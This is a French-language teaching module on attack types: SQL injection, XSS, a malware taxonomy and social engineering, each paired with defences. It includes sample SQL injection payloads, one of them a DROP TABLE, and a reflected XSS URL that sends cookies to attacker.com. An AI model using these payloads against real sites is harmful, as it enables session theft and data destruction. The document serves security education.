# Types d'Attaques Informatiques

Connaître les techniques d'attaque est indispensable pour savoir se défendre. Ce module couvre les attaques les plus répandues et dangereuses.

## Injections — OWASP #1

Les attaques par injection surviennent quand des données non validées sont envoyées à un interpréteur (SQL, shell, LDAP). La plus connue est l'injection SQL.

### SQL Injection

Une requête vulnérable construit dynamiquement du SQL avec des données utilisateur non validées.

```sql
-- Requête vulnérable (PHP)
SELECT * FROM users WHERE username = '$_GET[user]'

-- Payload malveillant
username = ' OR '1'='1
-- Résultat : retourne TOUS les utilisateurs

-- Payload destructeur
username = '; DROP TABLE users; --
```

### Défense — Requêtes préparées

La seule défense efficace est de ne jamais concaténer des données utilisateur dans une requête SQL.

```php
// PHP PDO — Requête préparée
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
// Le paramètre est traité comme DONNÉE, jamais comme SQL
```

### Autres types d'injections

- **Command Injection** : injection de commandes shell via des formulaires
- **LDAP Injection** : manipulation des requêtes d'annuaire
- **XPath Injection** : ciblant les bases XML

---

## XSS — Cross-Site Scripting

Le XSS permet d'injecter du JavaScript malveillant dans une page web vue par d'autres utilisateurs. Vecteur principal de vol de session et de phishing.

### XSS Reflected

Le script malveillant est inclus dans l'URL et exécuté immédiatement.

```html
https://site.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### XSS Stored (persistant)

Le script est stocké en base de données et exécuté pour chaque visiteur. Le plus dangereux.

### Défenses XSS

```javascript
// ✅ Sûr — textContent encode automatiquement
element.textContent = userInput;

// ❌ Dangereux — innerHTML exécute les scripts
element.innerHTML = userInput;
```

En-têtes HTTP de protection :

```
Content-Security-Policy: default-src 'self'; script-src 'self'
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## Malwares — Taxonomie complète

### Ransomware

Chiffre les fichiers de la victime et demande une rançon pour la clé de déchiffrement. Exemples : WannaCry (2017), LockBit, REvil. Vecteurs principaux : phishing, RDP exposé, vulnérabilités non patchées.

### RAT — Remote Access Trojan

Donne à l'attaquant un contrôle total de la machine à distance : keylogger, captures d'écran, accès webcam. Exemples : NjRAT, AsyncRAT, DarkComet.

### Worm (Ver)

Se propage automatiquement dans un réseau sans intervention humaine, exploitant des vulnérabilités réseau. Exemple : Conficker, WannaCry se propageait via EternalBlue.

### Rootkit

Se cache au niveau du système d'exploitation ou du noyau, rendant sa détection extrêmement difficile avec des antivirus classiques.

### Botnet

Réseau de machines infectées contrôlées par un serveur C2 (Command and Control). Utilisé pour les attaques DDoS distribuées, l'envoi de spam, le minage de cryptomonnaie.

---

## Ingénierie sociale

**80% des attaques réussies** impliquent une composante d'ingénierie sociale. L'humain est toujours le maillon le plus faible.

### Phishing

Email frauduleux imitant une organisation de confiance pour voler des identifiants ou installer un malware. Envoyé en masse.

### Spear Phishing

Version ciblée et personnalisée du phishing. L'attaquant se renseigne sur la victime pour rendre l'email crédible. Taux de succès bien plus élevé.

### Vishing et Smishing

Mêmes techniques par téléphone (vishing) ou SMS (smishing). De plus en plus utilisés pour contourner les filtres email.

### Pretexting

L'attaquant crée un scénario fictif crédible pour manipuler la victime. Exemple : se faire passer pour le support technique.

### Se protéger de l'ingénierie sociale

La sensibilisation et la formation des utilisateurs sont les meilleures défenses :

- Vérifier systématiquement l'identité des interlocuteurs
- Ne jamais cliquer sur des liens dans des emails urgents
- Appeler directement l'organisation concernée pour vérifier
- Mettre en place la MFA sur tous les comptes critiques
